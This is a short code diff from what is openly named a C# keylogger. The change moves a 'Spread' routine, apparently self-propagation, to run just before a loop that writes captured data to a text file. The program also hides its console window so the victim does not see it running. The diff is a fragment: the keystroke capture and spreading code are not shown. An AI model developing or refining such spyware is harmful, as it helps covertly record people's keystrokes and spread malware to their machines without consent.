@@ -31,7 +31,6 @@ namespace Keylogger
         static void Main(string[] args)
         {
             Program p = new Program();
-            p.Spread();
             var handle = GetConsoleWindow();
             ShowWindow(handle, SW_HIDE);
 
@@ -52,6 +51,7 @@ namespace Keylogger
             }
             else
             {
+               p.Spread();
                using (StreamWriter writer = new StreamWriter(pathTxt))
                {
                     while (chcSysEve == false)
